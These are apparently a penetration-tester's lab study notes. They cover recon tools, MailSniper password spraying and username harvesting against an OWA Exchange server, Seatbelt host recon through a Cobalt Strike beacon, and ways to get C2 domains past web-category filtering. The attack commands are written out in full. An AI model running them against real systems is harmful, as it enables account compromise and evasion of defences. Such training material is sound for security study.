# Cobalt Strike 
- see cobalt strike file 

# External Recon Tools

- whois 
- dig
- dnscan
- other osint tools known

# Initial compromise (DISABLE WINDOWS DEFENDER ON ATTACKER MACHINE) 

-Mail Sniper 
-namesmash.py

**Used for attacking OWA Exchange service at MAIL DOMAIN that was found during the external recon.**

**Technique: Password Spraying**

>PS C:\Users\Attacker> ipmo C:\Tools\MailSniper\MailSniper.ps1

##### Enumerate the NetBIOS name of the target domain with Invoke-DomainHarvestOWA.

>PS C:\Users\Attacker> Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io

##### Next, we need to find valid usernames from the list of users enumerated from https://cyberbotic.io.

>ubuntu@DESKTOP-3BSK7NO ~> cd /mnt/c/Users/Attacker/Desktop/
>ubuntu@DESKTOP-3BSK7NO /m/c/U/A/Desktop> cat names.txt
*We could potentially skip this step if we knew the email address format from somewhere like hunter.io.*

##### Invoke-UsernameHarvestOWA uses a timing attack to validate which (if any) of these usernames are valid.

>PS C:\Users\Attacker> Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt

##### MailSniper can spray passwords against the valid account(s) identified using, Outlook Web Access (OWA), Exchange Web Services (EWS) and Exchange ActiveSync (EAS).

>PS C:\Users\Attacker> Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022

##### PS C:\Users\Attacker> Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt

>PS C:\Users\Attacker> Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt

##### If there are names here that we didn't find during initial recon, we can go back and do another round of spraying against them.


# Host Recon 
**Technique: Recon**

## SeatBelt 

https://github.com/GhostPack/Seatbelt

Checks security configs once you have a beacon on a compromised host

1. beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system

One thing to note from this output is that there's a web proxy in place - squid.dev.cyberbotic.io.  This has implications for HTTP(S) C2 for a variety of reasons.

Web Categorisation

Domain names are categorised by vendors so that they can be lumped together for filtering purposes.  This is useful so that everything categorised as "gambling", "drugs", "violence", or "social media", etc can be blocked outright.  If the domain being used for part of your engagement ends up in a blocked category, it becomes effectively useless.

Two strategies for tackling this issue include:

    Obtaining a domain that is already in a desirable category.
    Requesting a change of category for a domain.


https://sitereview.bluecoat.com/#/  <<< checks site reps and categories 

https://github.com/mdsecactivebreach/Chameleon  <<< helps categorise c2 domains for red teams 

https://github.com/cobbr/Covenant <<< allows red teams to pin their c2 certs 







